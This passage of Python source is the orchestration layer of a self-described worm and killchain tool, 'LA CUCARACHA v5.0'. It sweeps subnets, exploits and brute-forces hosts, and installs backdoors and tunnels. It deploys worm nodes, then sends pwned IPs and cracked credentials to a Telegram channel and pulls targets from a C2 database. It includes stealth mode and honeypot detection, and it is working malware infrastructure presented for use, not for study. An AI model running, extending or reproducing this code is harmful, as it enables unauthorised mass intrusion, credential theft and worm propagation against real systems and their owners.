    def run_phase(self, phase_name: str) -> Dict:
        """Execute phase and report results via Telegram."""
        # IF/THEN SMART: Skip scan phases in stealth mode (only report pwns)
        if self._stealth_logging and phase_name in ("ICMP", "TCP", "FP", "SLEEP"):
            result = super().run_phase(phase_name)
            return result
        
        # IF/THEN SMART: Resource throttle — pause non-exploit phases if system strained
        if self._resource_throttled and phase_name not in ("WEB", "EMBED", "ENTERPRISE", "BRUTE", "BACKDOOR", "WORM"):
            # Skip lightweight phase when throttled, just do the critical ones
            result = super().run_phase(phase_name)
            return result
        
        # Report phase start
        self.reporter.short(phase_name, "START", "⏳ executing")
        
        # Execute phase — pass progress callback for long-running pwn phases
        extra = {}
        if phase_name in ("WEB", "EMBED", "ENTERPRISE", "BRUTE"):
            extra["progress_fn"] = self._web_progress
        # SMART: Pass decision_engine to FP phase for honeypot detection
        if phase_name == "FP":
            extra["decision_engine"] = self.decision_engine
        result = super().run_phase(phase_name, **extra)
        
        # Report phase result
        count = result.get("count", 0)
        success = result.get("success", False)
        detail = ""
        
        # Extract details for reporting
        if phase_name == "ICMP":
            detail = f"{count} alive hosts"
        elif phase_name == "TCP":
            detail = f"{count} open ports"
        elif phase_name == "FP":
            detail = f"{count} fingerprinted"
        elif phase_name == "CVE":
            detail = f"{count} CVEs found"
        elif phase_name in ["WEB", "EMBED", "ENTERPRISE", "BRUTE"]:
            if count > 0:
                detail = f"{count} pwned"
                # Batched pwn report — one message per phase
                targets = result.get("targets", [])
                pwn_lines = [f"💀 <b>PWNED {count} — {phase_name}</b>"]
                for t in targets[:20]:
                    ip = t.get("ip", "")
                    port = t.get("port", 0)
                    user = t.get("user", "")
                    pwd = t.get("pwd", "")
                    creds = f"<code>{user}:{pwd}</code>" if user and pwd else ""
                    line = f"  ▸ {ip}:{port}"
                    if creds:
                        line += f" — {creds}"
                    pwn_lines.append(line)
                if len(targets) > 20:
                    pwn_lines.append(f"  … and {len(targets) - 20} more")
                self.reporter._send("\n".join(pwn_lines))
            else:
                detail = "no pwns"
        elif phase_name == "BACKDOOR":
            detail = f"{count} backdoors installed"
        elif phase_name == "TUNNEL":
            detail = f"{count} tunnels active"
        elif phase_name == "WORM":
            detail = f"{count} worm nodes deployed"
        elif phase_name == "INTEL":
            detail = f"{count} intel logs"
        elif phase_name == "CROSSFEED":
            detail = f"{count} crossfeed ops"
        elif phase_name == "REPORT":
            detail = "report generated"
        elif phase_name == "SLEEP":
            detail = f"{count}s cooldown"
        
        # Send phase result
        self.reporter.phase_result(phase_name, count, success, detail)
        
        # IF/THEN: Report decision based on phase result
        if count > 0:
            if phase_name in ["WEB", "EMBED", "ENTERPRISE", "BRUTE"]:
                next_phase = self.decision_engine._phase_transitions.get(phase_name, "")
                self.reporter.decision(f"{count} pwned in {phase_name}", next_phase)
            elif phase_name in ["ICMP", "TCP", "FP", "CVE"]:
                self.reporter.decision(f"{count} hosts found in {phase_name}", f"Moving to next phase in pipeline")
            elif phase_name == "WORM":
                self.reporter.decision(f"{count} worm nodes deployed", "Continue replication")
            elif phase_name == "BACKDOOR":
                self.reporter.decision(f"{count} backdoors installed", "Persistence established")
        elif count == 0 and phase_name in ["WEB", "EMBED", "ENTERPRISE", "BRUTE"]:
            next_phase = self.decision_engine._phase_transitions.get(phase_name, "")
            self.reporter.decision(f"No pwns in {phase_name}, adjusting strategy", next_phase)
        
        return result
    
    def run_epoch(self) -> Dict:
        """Run epoch with Telegram reporting."""
        epoch_start = time.time()
        
        # Run the epoch
        result = super().run_epoch()
        
        # Send epoch summary via Telegram (every epoch)
        stats = self.db.stats()
        self.reporter.epoch_summary(
            self.epoch,
            stats,
            result.get("phases_executed", []),
            result.get("time", 0)
        )
        
        return result
    
    def run_continuous(self) -> Dict:
        """Run continuous with Telegram reporting and smart upgrades."""
        # Send startup message
        stealth_tag = " 🕵️ STEALTH" if self._stealth_logging else ""
        self.reporter._send(
            f"🚀 <b>LA CUCARACHA v5.0 — PREDATOR KILLCHAIN</b>{stealth_tag}\n"
            f"📡 16-Phase Pipeline: {' → '.join(PHASES_16)}\n"
            f"🔄 Max epochs: {self.max_epochs}\n"
            f"🗄️ DB: {self.db.path}"
        )
        
        # Run the killchain with epoch-level smart logic
        while self.epoch < self.max_epochs and not self._stop_flag:
            try:
                # IF/THEN SMART: Check system resources every interval
                now = time.time()
                if now - self._last_resource_check > self._resource_check_interval:
                    self._last_resource_check = now
                    cpu = _system_cpu_pct()
                    mem = _system_mem_pct()
                    disk = _system_disk_mb()
                    was_throttled = self._resource_throttled
                    self._resource_throttled = cpu > 85 or mem > 85 or disk < 100
                    if self._resource_throttled != was_throttled:
                        if self._resource_throttled:
                            self._telegram_resource_alert(cpu, mem, disk)
                            log.warning(f"⚡ Resource throttle engaged: CPU={cpu:.0f}% RAM={mem:.0f}% Disk={disk:.0f}MB")
                        else:
                            self.reporter._send("✅ <b>Resource normal</b> — Throttle released")
                            log.info("✅ Resource throttle released")
                
                # IF/THEN SMART: Record latency from ICMP phase results
                if hasattr(self, 'decision_engine') and hasattr(self.decision_engine, 'record_latency'):
                    # Sample a quick ping to known target for latency baseline
                    try:
                        r = subprocess.run(["ping", "-c1", "-W2", "-n", "8.8.8.8"],
                                        capture_output=True, timeout=3, text=True)
                        if r.returncode == 0:
                            m = re.search(r'time[=<](\d+\.?\d*)', r.stdout)
                            if m:
                                self.decision_engine.record_latency(float(m.group(1)))
                    except Exception:
                        pass
                
                # IF/THEN SMART: Adjust thread factor based on latency
                if hasattr(getattr(self, 'decision_engine', None), 'latency_thread_factor'):
                    factor = self.decision_engine.latency_thread_factor()
                    if factor < 1.0:
                        _ORCHESTRATOR_BATCH_SIZE = int(globals().get('_ORCHESTRATOR_BATCH_SIZE', 100) * factor)
                        log.info(f"📡 Latency throttle: thread factor={factor}, batch_size={_ORCHESTRATOR_BATCH_SIZE}")
                
                # Run epoch
                epoch_result = self.run_epoch()
                
                # IF/THEN SMART: Check early exit — worm established
                stats = self.db.stats()
                worm_nodes = stats.get('worm_deployed', 0)
                intel_logs = stats.get('intel_collected', 0)
                if worm_nodes >= 50 and intel_logs >= 100 and self.epoch >= 3:
                    self.reporter._send(
                        f"🚀 <b>Worm established</b> — {worm_nodes} nodes, {intel_logs} intel logs\n"
                        f"   Breaking to sustainment mode after {self.epoch + 1} epochs"
                    )
                    break
                
                # Throttle between epochs
                time.sleep(2)
                self.epoch += 1
            except KeyboardInterrupt:
                raise
            except Exception as e:
                log.error(f"💥 Epoch {self.epoch} error: {e}")
                time.sleep(5)
                self.epoch += 1
        
        # Flatten result
        result = {
            "total_epochs": self.epoch,
            "final_stats": self.db.stats(),
            "report": {"phase_completion": self.db.phase_completion()} if hasattr(self.db, 'phase_completion') else {},
        }
        
        # Send final report
        stats = self.db.stats()
        report = result.get("report", {})
        self.reporter.final_report(result.get("total_epochs", 0), stats, report)
        
        # Flush any remaining messages
        self.reporter.flush()
        
        return result
    
    def stop(self):
        """Stop orchestrator and reporter."""
        super().stop()
        self.reporter.stop()


# ═══════════════════════════════════════════════════════════════════════════════
# FINAL MAIN — Complete Integration
# ═══════════════════════════════════════════════════════════════════════════════

def main_complete():
    """Complete main entry point with all features."""
    parser = argparse.ArgumentParser(
        description="🐛 LA CUCARACHA v5.0 — Complete 16-Phase Predator Killchain",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
PHASES:
  📡 ICMP → 🔍 TCP → 🖥️ FP → 🧨 CVE → 🌐 Web → ⚙️ Embed → 🧟 Genzai
  → 🏢 Enterprise → 🔑 Brute → 🚪 Backdoor → 🔌 Tunnel → 🐛 Worm
  → 🧠 Intel → 💤 Sleep → 🔄 Crossfeed → 📦 Intel Report

IF/THEN LOGIC:
  - IF targets found → proceed to next phase
  - IF no targets → retry current phase or rotate subnet
  - IF hit streak > 5 → short sleep (5s)
  - IF empty streak > 5 → long sleep (30s)
  - IF phase fails repeatedly → force advance

TELEGRAM:
  --telegram-token TOKEN   Bot token for Telegram reports
  --chat-id ID            Chat ID for Telegram reports

EXAMPLES:
  %(prog)s                              # Full autonomous killchain
  %(prog)s --epochs 10                  # Run 10 epochs
  %(prog)s --telegram-token TOKEN       # With Telegram reporting
  %(prog)s --status                     # Show current status
  %(prog)s --clean                      # Reset database
  %(prog)s --phase ICMP                 # Run single phase
        """
    )
    
    # Core args
    parser.add_argument("--epochs", type=int, default=100, help="Max epochs (default: 100)")
    parser.add_argument("--phase", type=str, choices=PHASES_16, help="Run a single phase and exit")
    parser.add_argument("--status", action="store_true", help="Show current orchestrator status")
    parser.add_argument("--clean", action="store_true", help="Reset database")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose logging")
    parser.add_argument("--db", type=str, default="worm_mesh_v5.db", help="Database path")
    parser.add_argument("--auto", action="store_true", help="Auto mode (legacy compat)")
    parser.add_argument("--stealth", action="store_true", help="Stealth mode (legacy compat)")
    
    # Telegram args
    parser.add_argument("--telegram", action="store_true", default=False, help="Start Telegram Command Center bot")
    parser.add_argument("--telegram-token", type=str, default="", help="Telegram bot token")
    parser.add_argument("--chat-id", type=int, default=None, help="Telegram chat ID")
    parser.add_argument("--dry-run", action="store_true", help="Dry run (no actual Telegram sends)")
    
    # Phase tuning
    parser.add_argument("--subnets", type=int, default=3, help="Number of subnets per ICMP/TCP pass")
    parser.add_argument("--hosts-per-subnet", type=int, default=7, help="Hosts to ping per subnet")
    parser.add_argument("--batch-size", type=int, default=100, help="Targets per phase batch")
    
    args = parser.parse_args()
    
    # Setup logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
        stream=sys.stdout,
        force=True,
    )
    
    # Handle clean
    if args.clean:
        if os.path.exists(args.db):
            os.remove(args.db)
            print(f"✅ Database {args.db} cleaned")
        else:
            print(f"ℹ️ Database {args.db} does not exist")
        return
    
    # Initialize database
    db = KillchainDB(args.db)
    
    # Handle status
    if args.status:
        temp_orch = KillchainOrchestrator(db, 1)
        status = temp_orch.get_status()
        print("\n📊 ORCHESTRATOR STATUS")
        print("="*50)
        for key, value in status.items():
            print(f"  {key}: {value}")
        print("="*50)
        return
    
    # Handle single phase
    if args.phase:
        print(f"\n🎯 Running single phase: {args.phase}")
        print("="*50)
        temp_orch = KillchainOrchestrator(db, 1)
        result = temp_orch.run_phase(args.phase)
        print(json.dumps(result, indent=2, default=str))
        return
    
    # Full killchain
    print("\n" + "="*70)
    print("🐛 LA CUCARACHA v5.0 — PREDATOR KILLCHAIN")
    print("="*70)
    print(f"📡 16-Phase Pipeline: {' → '.join(PHASES_16)}")
    print(f"🔄 Max epochs: {args.epochs}")
    print(f"📡 Subnets: {args.subnets}")
    print(f"🏠 Hosts per subnet: {args.hosts_per_subnet}")
    print(f"🗄️ Database: {args.db}")
    # Detect Telegram status (token may come from config/env/fallback)
    _has_telegram = bool(args.telegram_token) or bool(os.environ.get("TELEGRAM_BOT_TOKEN")) or os.path.exists("/opt/hermes/telegram_config.json")
    if _has_telegram:
        print(f"🤖 Telegram: Enabled")
    else:
        print(f"🤖 Telegram: Disabled (no token found)")
    print("="*70)
    print("\n⚡ PRESS Ctrl+C TO STOP\n")
    
    try:
        # Always use EnhancedKillchainOrchestrator — TelegramReporter
        # autodetects token from config file / env var / hardcoded fallback
        orchestrator = EnhancedKillchainOrchestrator(
            db,
            max_epochs=args.epochs,
            telegram_token=args.telegram_token,
            chat_id=args.chat_id
        )
        if args.dry_run:
            orchestrator.reporter.dry_run = True
        
        # IF/THEN SMART: Wire stealth mode to reporter
        if args.stealth:
            orchestrator._stealth_logging = True
            orchestrator.reporter._stealth_mode = True
            log.info("🕵️ Stealth mode enabled — scan phases suppressed in Telegram")
        
        # Set phase parameters
        orchestrator.subnets = args.subnets
        orchestrator.hosts_per_subnet = args.hosts_per_subnet
        
        # Monkey-patch phase functions
        globals()['_ORCHESTRATOR_SUBNETS'] = args.subnets
        globals()['_ORCHESTRATOR_HOSTS_PER_SUBNET'] = args.hosts_per_subnet
        globals()['_ORCHESTRATOR_BATCH_SIZE'] = args.batch_size
        
        def _icmp_with_params(db: KillchainDB) -> Dict:
            return phase_icmp_sweep(db,
                                   subnets=globals().get('_ORCHESTRATOR_SUBNETS', 3),
                                   hosts_per_subnet=globals().get('_ORCHESTRATOR_HOSTS_PER_SUBNET', 7))

        orchestrator.phase_map["ICMP"] = _icmp_with_params

        # IF/THEN SMART: Use v2 FP with honeypot detection — passes decision_engine
        orchestrator.phase_map["FP"] = phase_fp_scan_v2
        
        # ---- Initialize Telegram Command Center (if --telegram flag) ----
        telegram_bot = None
        if hasattr(args, "telegram") and args.telegram:
            try:
                import sys as _tg_sys
                _tg_sys.path.insert(0, "/opt/hermes")
                from la_telegram_bot import _init_telegram_bot as _tg_init
                # Create mesh engine for bot interactive commands (scan, exploit, deploy, etc.)
                mesh_engine = WormMeshEngine(db=db)
                telegram_bot = _tg_init(args, db, mesh_engine)
                if telegram_bot:
                    print(f"🤖 Telegram Command Center ONLINE")
            except Exception as e:
                log.error(f"Telegram bot init error: {e}")

        # Run continuous
        result = orchestrator.run_continuous()
        
        print("\n" + "="*70)
        print("🏁 KILLCHAIN COMPLETE")
        print("="*70)
        print(f"  Total epochs: {result['total_epochs']}")
        print(f"  Targets: {result['final_stats'].get('targets', 0)}")
        print(f"  Worm nodes: {result['final_stats'].get('worm_deployed', 0)}")
        print(f"  Intel logs: {result['final_stats'].get('intel_collected', 0)}")
        print(f"  Credentials: {result['final_stats'].get('credentials', 0)}")
        print("="*70)
        
        # Print epoch summary
        orchestrator.print_epoch_summary()
        
    except KeyboardInterrupt:
        print("\n\n🛑 Received interrupt — shutting down gracefully...")
        orchestrator.stop()
        print("✅ Orchestrator stopped")
        orchestrator.print_epoch_summary()
        
    except Exception as e:
        log.exception(f"💥 Fatal error: {e}")
        print(f"\n❌ Fatal error: {e}")
        sys.exit(1)


# ═══════════════════════════════════════════════════════════════════════════════
# ULTIMATE ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    # Entry handled by ultimate_16_main() below
    pass










# =============================================================================
# ULTIMATE 16-PHASE PREDATOR ENTRY POINT
# =============================================================================

def ultimate_16_main():
    parser = argparse.ArgumentParser(description="🐛 LA CUCARACHA — ULTIMATE 16-PHASE PREDATOR")
    parser.add_argument("--v2", action="store_true", help="Run original v2.0 engine")
    parser.add_argument("--epochs", type=int, default=100)
    parser.add_argument("--telegram", action="store_true", default=False, help="Start Telegram Command Center bot")
    parser.add_argument("--telegram-token", type=str)
    parser.add_argument("--chat-id", type=int)
    args, _ = parser.parse_known_args()
    
    if args.v2:
        print("🚀 Launching La Cucaracha v2.0 Engine...")
        main()
    else:
        print("🚀 Launching La Cucaracha v5.0 Ultimate Predator Killchain...")
        # Initialize Core v2 Database and Engines
        db_v2 = Database()
        
        # ═══ LA CUCARACHA — PLUG-IN HUB ═══
        # Ingest ALL targets, creds, pwned from C2 DB + Borg intel
        try:
            import la_cucaracha_plugin_hub as hub
            hub_results = hub.import_all()
            total_new = (
                hub_results.get("creds_c2", {}).get("imported", 0)
                + hub_results.get("targets_c2", {}).get("imported", 0)
                + hub_results.get("borg_intel", {}).get("imported", 0)
            )
            print(f"🔌 Plugin Hub: {total_new} new targets/creds imported")
        except Exception as e:
            print(f"⚠️ Plugin Hub skipped: {e}")

        # Initialize the Enhanced Killchain Orchestrator (from the 137KB logic)
        main_complete()

if __name__ == "__main__":
    ultimate_16_main()
